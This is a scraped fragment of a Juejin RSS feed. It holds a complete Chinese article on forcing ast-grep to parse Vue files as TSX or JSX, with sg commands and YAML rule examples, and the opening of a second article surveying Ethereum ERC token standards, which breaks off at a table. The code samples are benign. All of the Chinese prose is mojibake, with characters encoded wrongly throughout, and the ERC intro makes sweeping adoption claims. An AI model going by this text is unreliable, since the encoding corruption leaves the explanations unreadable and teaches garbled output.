                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¥ä¸Šä¸€ç¯‡åšå®¢: <a href="https://juejin.cn/post/7579819594270785574" target="_blank" title="https://juejin.cn/post/7579819594270785574">ast-grepï¼šç»“æ„åŒ–æœç´¢ä¸é‡æ„åˆ©å™¨ast-grep çš„ä¸»è¦è®ºç‚¹æ˜¯åœ¨æ–‡æœ¬ grep ä¸é‡é‡çº§ AST å·¥å…·ä¹‹é—´å»ºç«‹ä¸€åº§ - æ˜é‡‘</a></p>
<p>åœ¨å¤šè¯­è¨€é¡¹ç›®é‡Œï¼Œæ–‡ä»¶æ‰©å±•åæœªå¿…ç­‰äºæƒ³è¦çš„è§£æè¯­æ³•ï¼šæ¯”å¦‚ <code>.vue</code> å†…åµŒ <code>&lt;script setup lang="tsx"&gt;</code>ï¼Œä½†é»˜è®¤è§£æå™¨å¯èƒ½æŠŠæ•´æ–‡ä»¶å½“æˆ Vue è¯­æ³•ï¼Œå¯¼è‡´ TS/TSX è§„åˆ™åŒ¹é…ä¸åˆ°ã€‚ast-grep æä¾›ä¸¤æ¡è·¯å¯ä»¥â€œå¼ºåˆ¶â€æŒ‡å®šè§£æè¯­è¨€ï¼š</p>
<ol>
<li>å‘½ä»¤è¡Œä¸´æ—¶æŒ‡å®š <code>--lang</code>ï¼›</li>
<li>åœ¨è§„åˆ™/é…ç½®æ–‡ä»¶é‡Œç”¨ <code>language</code> è¦†ç›–ã€‚
æœ¬æ–‡ç»™å‡ºå¯ç›´æ¥å¤ç”¨çš„å‘½ä»¤ã€é…ç½®ç¤ºä¾‹ï¼Œä»¥åŠåœ¨ Vue/Pug åœºæ™¯ä¸‹çš„é¿å‘æ–¹æ¡ˆã€‚</li>
</ol>
<h2 data-id="heading-0">æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œä¸´æ—¶æŒ‡å®šè¯­è¨€</h2>
<p>é€‚åˆä¸€æ¬¡æ€§æŸ¥è¯¢æˆ–å¿«é€ŸéªŒè¯æ¨¡å¼ã€‚</p>
<h3 data-id="heading-1">åŸºæœ¬ç”¨æ³•</h3>
<pre><code class="hljs language-bash" lang="bash">sg run --lang tsx -p <span class="hljs-string">'defineProps($P)'</span> src/views/yufukuan/Yufukuan.vue
</code></pre>
<ul>
<li><code>--lang tsx</code>ï¼šå¼ºåˆ¶æŠŠè¾“å…¥æ–‡ä»¶æŒ‰ TSX è§£æï¼Œå³ä½¿æ‰©å±•åæ˜¯ <code>.vue</code>ã€‚</li>
<li><code>-p 'defineProps($P)'</code>ï¼šæ¨¡å¼ç¤ºä¾‹ï¼Œå¯æ›¿æ¢æˆä»»æ„ TS/TSX è¯­æ³•æ¨¡å¼ã€‚</li>
</ul>
<h3 data-id="heading-2">å¦‚æœæ¨¡æ¿å¹²æ‰°è§£æ</h3>
<ul>
<li>ç°æœ‰ tree-sitter-vue å¯¹ <code>lang="pug"</code> æ¨¡æ¿ä¸åš AST è§£æï¼Œå‘½ä»¤ä¼šæŠŠæ¨¡æ¿å½“ä½œæ–‡æœ¬ï¼Œå¯èƒ½è§¦å‘ ERRORã€‚</li>
<li>è§£å†³æ€è·¯ï¼š
<ol>
<li>ä»…å–‚ <code>&lt;script&gt;</code> éƒ¨åˆ†ï¼šå…ˆç”¨è„šæœ¬æå– <code>&lt;script&gt;</code>ï¼Œå†é€šè¿‡ stdin ä¼ ç»™ sgã€‚
<pre><code class="hljs language-bash" lang="bash">node -e <span class="hljs-string">"const fs=require('fs');const txt=fs.readFileSync('src/views/yufukuan/Yufukuan.vue','utf8');const m=txt.match(/&lt;script[\\s\\S]*?&lt;\\/script&gt;/);if(m)process.stdout.write(m[0]);"</span> \
  | sg run --lang tsx --stdin -p <span class="hljs-string">'defineProps($P)'</span>
</code></pre>
</li>
<li>ä¸´æ—¶æ”¹æ¨¡æ¿ä¸ºæ™®é€š HTMLï¼ˆä¸æ”¹éœ€æ±‚æ—¶å°±åˆ«è¿™ä¹ˆåšï¼‰ï¼Œç¡®è®¤è§£æå™¨å¯å·¥ä½œåå†å›æ»šã€‚</li>
</ol>
</li>
</ul>
<h3 data-id="heading-3">åªæƒ³åšæ–‡æœ¬çº§åŒ¹é…</h3>
<p>å¦‚æœè§£æå™¨å¯¹æ¨¡æ¿æŠ¥é”™ï¼Œå¯ä»¥é™çº§ç”¨æ¨¡æ¿ä¸¥æ ¼åº¦æˆ–çº¯æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sg run --lang vue --strictness template -p <span class="hljs-string">'handlerEditInst'</span> src/views/**/*.vue
</code></pre>
<p>è¿™ä¸ä¼šç»™å‡º AST ç»“æ„ï¼Œä½†å¯åœ¨ VSCode/CLI å†…å¿«é€Ÿæ‰¾å…³é”®è¯ã€‚</p>
<h2 data-id="heading-4">æ–¹æ³•äºŒï¼šåœ¨è§„åˆ™/é…ç½®é‡ŒæŒ‡å®šè¯­è¨€</h2>
<p>é€‚åˆéœ€è¦å¤šæ¬¡å¤ç”¨çš„è§„åˆ™æˆ–é›†æˆåˆ° <code>sg scan</code> çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-5">è§„åˆ™æ–‡ä»¶ç¤ºä¾‹</h3>
<p>æ–°å»ºè§„åˆ™ <code>rules/vue-script-tsx.yml</code>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">vue-script-tsx-define-props</span>
<span class="hljs-attr">language:</span> <span class="hljs-string">tsx</span>            <span class="hljs-comment"># è¿™é‡Œå¼ºåˆ¶æŒ‰ TSX è§£æ</span>
<span class="hljs-attr">rule:</span>
  <span class="hljs-attr">pattern:</span> <span class="hljs-string">"defineProps($P)"</span>
</code></pre>
<p>è¦è®©è§„åˆ™åªä½œç”¨äºæŒ‡å®šè·¯å¾„ï¼Œå¯ä»¥é…åˆ <code>files</code> æˆ–åœ¨è¿è¡Œæ—¶ç”¨ <code>--globs</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sg scan --config sgconfig.yml --globs <span class="hljs-string">"src/**/*.vue"</span> --rules vue-script-tsx-define-props
</code></pre>
<p>è¯´æ˜ï¼š</p>
<ul>
<li><code>language</code> å­—æ®µè¦†ç›–æ‰©å±•åé»˜è®¤è§£æå™¨ã€‚</li>
<li>æ¨¡å¼ä»éœ€ç¬¦åˆè¯¥è¯­è¨€è¯­æ³•ï¼›è‹¥æ¨¡æ¿æ®‹ç•™ä¼šå¯¼è‡´ ERRORï¼Œå¯ç»“åˆâ€œåªå–‚è„šæœ¬â€æˆ–åœ¨è§„åˆ™é‡Œå¢åŠ æ¡ä»¶è¿‡æ»¤ã€‚</li>
</ul>
<h3 data-id="heading-6">é’ˆå¯¹ JS/JSX çš„ç¤ºä¾‹</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">vue-script-jsx-import-check</span>
<span class="hljs-attr">language:</span> <span class="hljs-string">jsx</span>
<span class="hljs-attr">rule:</span>
  <span class="hljs-attr">pattern:</span> <span class="hljs-string">"import $A from '$B'"</span>
</code></pre>
<p>è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sg scan --config sgconfig.yml --globs <span class="hljs-string">"src/**/*.vue"</span> --rules vue-script-jsx-import-check
</code></pre>
<h2 data-id="heading-7">å¸¸è§é—®é¢˜ä¸å¤„ç†</h2>
<ul>
<li>â€œPattern contains an ERROR nodeâ€ï¼š
<ul>
<li>è§£æå™¨åœ¨é‡åˆ°æ¨¡æ¿/éç›®æ ‡è¯­æ³•æ—¶äº§ç”Ÿé”™è¯¯ã€‚å°è¯•æå– <code>&lt;script&gt;</code> åå†è§£æï¼Œæˆ–ä¸´æ—¶ç§»é™¤ Pug è¯­æ³•æµ‹è¯•ã€‚</li>
</ul>
</li>
<li>â€œmatched nothingâ€ ä¸”æ— é”™è¯¯ï¼š
<ul>
<li>ç¡®è®¤æ¨¡å¼è¯­æ³•åˆæ³•ï¼›ç”¨ <code>--debug-query=pattern</code> æŸ¥çœ‹è§£æç»“æœã€‚</li>
</ul>
</li>
<li>VSCode æ’ä»¶æ— ç»“æœä½† CLI æ­£å¸¸ï¼š
<ul>
<li>VSCode ä¹Ÿä¾èµ–åŒä¸€è§£æå™¨ï¼Œå¯¹ Pug/TSX ä¸€æ ·å—é™ã€‚å¯åœ¨æ’ä»¶é‡Œç”¨æ–‡æœ¬æ¨¡å¼ï¼Œæˆ–ç­‰å¾…æ”¯æŒæ›´å¥½çš„è§£æå™¨ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-8">å®æ“å»ºè®®ï¼ˆVue é¡¹ç›®ï¼‰</h2>
<ol>
<li>å…ˆåœ¨ CLI éªŒè¯ï¼š
<pre><code class="hljs language-bash" lang="bash">sg run --lang tsx -p <span class="hljs-string">'defineProps($P)'</span> src/views/foo.vue
</code></pre>
</li>
<li>è‹¥æ¨¡æ¿å¯¼è‡´ ERRORï¼Œå…ˆç”¨è„šæœ¬æå– <code>&lt;script&gt;</code> å†æœã€‚</li>
<li>éœ€è¦é‡å¤ç”¨çš„æŸ¥è¯¢ï¼Œå†™è¿› <code>rules/*.yml</code>ï¼ŒåŠ ä¸Š <code>language: tsx/js/jsx</code>ï¼Œé€šè¿‡ <code>sg scan --globs "src/**/*.vue"</code> è¿è¡Œã€‚</li>
<li>å¦‚æœå¿…é¡»ç»“æ„åŒ–è§£ææ¨¡æ¿å±‚ï¼ˆPugï¼‰ï¼Œè¦ä¹ˆæŠŠæ¨¡æ¿æ”¹ä¸º HTMLï¼Œè¦ä¹ˆå¯»æ‰¾/è‡ªå»ºæ”¯æŒ Pug çš„ Vue è§£æå™¨é‡æ–°ç¼–è¯‘ <code>vue.so</code>ã€‚</li>
</ol>
<h2 data-id="heading-9">ç»“è¯­</h2>
<p>ast-grep æ”¯æŒåœ¨å‘½ä»¤è¡Œå’Œè§„åˆ™å±‚åŒé‡è¦†å†™è§£æè¯­è¨€ï¼Œè¿™è®©ä½ å¯ä»¥åœ¨æ··åˆæ–‡ä»¶ä¸­å¯¹è„šæœ¬éƒ¨åˆ†è¿›è¡Œç»“æ„åŒ–æœç´¢ã€‚ä½†è§£æå™¨èƒ½åŠ›æ˜¯å¤©èŠ±æ¿ï¼šå½“æ¨¡æ¿/è„šæœ¬è¯­æ³•ä¸è¢«æ”¯æŒæ—¶ï¼ˆå¦‚ Pug + TSXï¼‰ï¼Œéœ€è¦å…ˆè£å‰ªè¾“å…¥æˆ–æ›´æ¢è§£æå™¨ï¼Œå¦åˆ™åªèƒ½é€€åŒ–ä¸ºæ–‡æœ¬åŒ¹é…ã€‚æŒ‰ç…§æœ¬æ–‡çš„å‘½ä»¤ä¸é…ç½®ç¤ºä¾‹ï¼Œå¯ä»¥å¿«é€Ÿåœ¨ Vue é¡¹ç›®é‡Œå¯¹è„šæœ¬é€»è¾‘åš TS/TSX/JSX çº§åˆ«çš„ç²¾ç¡®æŸ¥è¯¢ï¼Œè€Œä¸å¿…ç­‰å¾…é»˜è®¤è§£æå™¨å®Œå–„ã€‚***</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7580988382761205775</link>    <guid>https://juejin.cn/post/7580988382761205775</guid>    <pubDate>2025-12-08T05:21:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761205775" data-draft-id="7580616979473448966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="web3,æ™ºèƒ½åˆçº¦,Solidity"/> <meta itemprop="datePublished" content="2025-12-08T05:21:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ¨è¥¿"/> <meta itemprop="url" content="https://juejin.cn/user/2436173496845549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173496845549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ¨è¥¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:21:04.000Z" title="Mon Dec 08 2025 05:21:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>åœ¨åŒºå—é“¾çš„æµ©ç€šæ˜Ÿç©ºä¸­ï¼ŒERCæ ‡å‡†å¦‚åŒä¸€é¢—é¢—ç²¾å¯†æ ¡å‡†çš„æ˜Ÿè¾°ï¼Œæ„æˆäº†ä»¥å¤ªåŠç”Ÿæ€ç³»ç»Ÿæœ€åšå®çš„åæ ‡ç³»ã€‚ä»2015å¹´ERC-20å¼€å¯ä»£å¸åŒ–æµªæ½®ï¼Œåˆ°å¦‚ä»Šè¶…è¿‡200é¡¹ææ¡ˆäº¤ç»‡æˆçš„æ ‡å‡†åŒ–ç½‘ç»œï¼Œè¿™äº›æŠ€æœ¯è§„èŒƒä¸ä»…å®šä¹‰äº†æ•°å­—èµ„äº§çš„äº¤äº’è¯­è¨€ï¼Œæ›´åœ¨2025å¹´æˆä¸ºè¿æ¥è™šæ‹Ÿç»æµä¸å®ä½“ä¸–ç•Œçš„æ¡¥æ¢ã€‚</p>
<p>å½“å‰ï¼Œæˆ‘ä»¬æ­£ç«™åœ¨Web3å‘å±•å²ä¸Šçš„å…³é”®æ‹ç‚¹ã€‚ç›‘ç®¡æ¡†æ¶çš„æˆç†Ÿï¼ˆå¦‚é¦™æ¸¯ç¨³å®šå¸æ¡ä¾‹ä¸RWAç™»è®°å¹³å°ï¼‰ã€æŠ€æœ¯æ ˆçš„å·¥ä¸šåŒ–ï¼ˆEIP-4337è´¦æˆ·æŠ½è±¡æ™®åŠç‡è¶…60%ï¼‰ï¼Œä»¥åŠè·¨é“¾äº’æ“ä½œæ€§çš„åˆšéœ€ï¼Œå…±åŒæ¨åŠ¨äº†ERCæ ‡å‡†ä»"å¯é€‰é¡¹"å‘"å¿…é€‰é¡¹"çš„èœ•å˜ã€‚æ— è®ºæ˜¯DeFiåè®®è¿½æ±‚èµ„æœ¬æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œè¿˜æ˜¯RWAèµ„äº§é¢ä¸´åˆè§„è½åœ°çš„åˆšæ€§çº¦æŸï¼Œäº¦æˆ–æ˜¯æ™®é€šç”¨æˆ·å¯¹æ— æ„ŸåŒ–ä½“éªŒçš„è¿«åˆ‡éœ€æ±‚ï¼Œéƒ½åœ¨å‘¼å”¤ä¸€ä¸ªæ›´æ¸…æ™°ã€æ›´å®ç”¨ã€æ›´å…·å‰ç»æ€§çš„æ ‡å‡†å¯¼èˆªå›¾ã€‚</p>
<p>æœ¬æ–‡å°†æŠ›å´å†—é•¿è®ºè¿°ï¼Œä»¥å·¥ç¨‹å¸ˆçš„åŠ¡å®è§†è§’ï¼Œä¸ºæ‚¨å‘ˆç°ä¸€ä»½2025å¹´ERCæ ‡å‡†çš„"æ´»åœ°å›¾"ã€‚æˆ‘ä»¬ä¸ä»…ä¼šæ‹†è§£ERC-20ã€ERC-721ç­‰åŸºçŸ³æ€§åè®®çš„ç”Ÿå­˜æ³•åˆ™ï¼Œæ›´ä¼šæ·±åº¦èšç„¦ERC-4626ï¼ˆDeFiæ”¶ç›Šå±‚äº‹å®æ ‡å‡†ï¼‰ã€ERC-3643ï¼ˆRWAåˆè§„å”¯ä¸€è·¯å¾„ï¼‰ã€ERC-4337ï¼ˆç”¨æˆ·ä½“éªŒé©å‘½ï¼‰è¿™ä¸‰å¤§æ”¹å˜è¡Œä¸šæ ¼å±€çš„æ–°æ˜Ÿã€‚åŒæ—¶ï¼Œæˆ‘ä»¬æ¢³ç†äº†è·¨é“¾èµ„äº§ã€AIç”Ÿæˆå†…å®¹ã€æŠ—é‡å­å®‰å…¨ç­‰å‰æ²¿é¢†åŸŸçš„æœ€æ–°è§„èŒƒï¼Œå¹¶é™„ä¸Šä¸€ä»½å¯ç›´æ¥ç”¨äºç”Ÿäº§ç¯å¢ƒçš„"æŠ€æœ¯é€‰å‹å†³ç­–è¡¨"ã€‚
æ— è®ºæ‚¨æ˜¯æ„å»ºä¸‹ä¸€ä¸ªæ€æ‰‹çº§åº”ç”¨çš„å¼€å‘è€…ï¼Œè¿˜æ˜¯è¯„ä¼°é¡¹ç›®æŠ€æœ¯åŸºæœ¬é¢çš„æŠ•èµ„è€…ï¼Œäº¦æˆ–æ˜¯æ¢ç´¢Web3è¾¹ç•Œçš„åˆ›æ–°è€…ï¼Œè¿™ä»½æ±‡æ€»éƒ½å°†æˆä¸ºæ‚¨ç©¿è¶Šå¤æ‚æŠ€æœ¯è¿·é›¾çš„æŒ‡å—é’ˆâ€”â€”å› ä¸ºåœ¨è¿™ä¸ªæ ‡å‡†åŒ–é©±åŠ¨çš„æ—¶ä»£ï¼Œé€‰æ‹©æ­£ç¡®çš„ERCæ ‡å‡†ï¼Œå°±æ˜¯é€‰æ‹©äº†é€šå¾€æœªæ¥çš„æ·å¾„ã€‚</p>
</blockquote>
<h2 data-id="heading-1">ERCæ ‡å‡†æ˜¯ä»€ä¹ˆ</h2>
<p>ERCï¼ˆEthereum Request for Commentï¼‰æ˜¯ä»¥å¤ªåŠå¼€å‘è€…æäº¤çš„åè®®ææ¡ˆï¼Œç»EIPæµç¨‹æ‰¹å‡†åæˆä¸ºå¼ºåˆ¶æ€§æˆ–æ¨èæ€§æ ‡å‡†ã€‚æˆªè‡³2025å¹´ï¼Œä»¥å¤ªåŠç”Ÿæ€å·²æœ‰è¶…è¿‡200ä¸ªERCæ ‡å‡†ï¼Œå…¶ä¸­çº¦30ä¸ªè¢«å¹¿æ³›ä½¿ç”¨</p>
<h2 data-id="heading-2"><strong>æ ¸å¿ƒä»£å¸æ ‡å‡†åˆ†ç±»</strong></h2>
<h4 data-id="heading-3">1. <strong>åŒè´¨åŒ–ä»£å¸</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åŠŸèƒ½ç®€è¿°</th><th>åº”ç”¨åœºæ™¯</th><th>2025å¹´çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-20</strong></td><td>Token Standard</td><td>åŸºç¡€è½¬è´¦ã€æˆæƒã€ä½™é¢æŸ¥è¯¢</td><td>USDTã€UNIã€æ‰€æœ‰æ²»ç†ä»£å¸</td><td>âœ… ç»å¯¹åŸºçŸ³ï¼Œ100%é¡¹ç›®ä½¿ç”¨</td></tr><tr><td><strong>ERC-2612</strong></td><td>Permit Extension</td><td>ç¦»çº¿ç­¾åæˆæƒï¼ˆæ— gas approveï¼‰</td><td>DAIã€USDCã€DeFiåè®®é›†æˆ</td><td>âœ… æ–°ä»£å¸æ ‡é…ï¼Œç”¨æˆ·ä½“éªŒå¿…å¤‡</td></tr></tbody></table>
<h4 data-id="heading-4">2. <strong>éåŒè´¨åŒ–ä»£å¸</strong></h4>








































